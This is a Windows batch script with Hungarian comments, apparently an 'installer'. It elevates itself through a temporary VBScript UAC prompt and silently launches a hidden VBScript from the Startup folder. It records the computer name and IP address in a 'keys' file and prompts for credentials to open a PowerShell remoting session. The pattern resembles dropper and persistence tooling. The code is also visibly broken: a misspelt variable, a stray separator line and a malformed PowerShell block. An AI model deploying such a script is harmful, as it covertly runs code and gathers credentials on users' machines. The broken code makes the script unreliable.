@echo off
setlocal enabledelayedexpansion

REM Ellenorzi es kerdezi a rendszergazdai jogosultsagot

NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo Rendszergazdai jogosultsagok megerositve. Folytatas...
    goto admin_folytatas
) ELSE (
    echo Rendszergazdai jogosultsagok kerese...
    goto ker_admin
)

:ker_admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //B "%temp%\getadmin.vbs"
    exit

:admin_folytatas
:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: hozzon létre egy keys.txt filet, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt")


set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: ha nincs ilyen mappa, hozza létre
if not exist "%STARTUP_FOLDER%" (
    mkdir "%STARTUP_FOLDER%"
)
:: >>> VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
echo [INFO] A sifustartup5sfgj.vbs inditasa WScript.Shell-lel...
start "" "wscript.exe" "%STARTPU_FOLDER%\sifustartup5sfgj.vbs"
echo [SIKER] VBScript elindult (háttérben).

:: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
set "GEPNEV=%COMPUTERNAME%"

:: IPv4 cim
for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"

---

:: Mentés keys.txt-be
:: EZ A BLOKK IRJA FELÜL AZ ELŐZŐ "Created by installer" TARTALMÚ FÁJLT!
(
    echo GEPNEV: !GEPNEV!
    echo IP: !IP!
) > "%TARGET%\keys.txt"

echo [INFO] A keys.txt elkeszult a %TARGET% mappaban.
echo [INFO] PowerShell Remoting elinditasa a %IP% cimen...
echo.

:: POWERHSHELL REMOTING BLOKK
powershell.exe -Command "
    $user = Get-Credential;
    Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
    Enter-PSSession -ComputerName %IP% -Credential $user
"

echo.
echo [INFO] A munkamenet befejezodott vagy megszakadt.

echo.
pause
